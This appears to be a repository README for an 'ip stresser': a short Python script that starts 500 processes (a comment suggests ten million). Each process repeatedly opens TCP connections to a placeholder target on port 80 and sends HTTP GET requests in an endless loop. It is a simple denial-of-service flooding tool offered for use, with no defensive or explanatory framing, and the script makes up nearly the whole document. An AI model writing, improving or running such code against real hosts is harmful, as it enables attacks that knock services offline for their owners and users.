# stresser
its an ip stresser 
C import socket
import time
from multiprocessing import Process

def send_packet():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("Ip_goes_here", 80))
        sock.send(b"GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n")
        sock.close()
        time.sleep(0.1)

if __name__ == "__main__":
    processes = []
    for _ in range(500):  #10000000
        p = Process(target=send_packet)
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
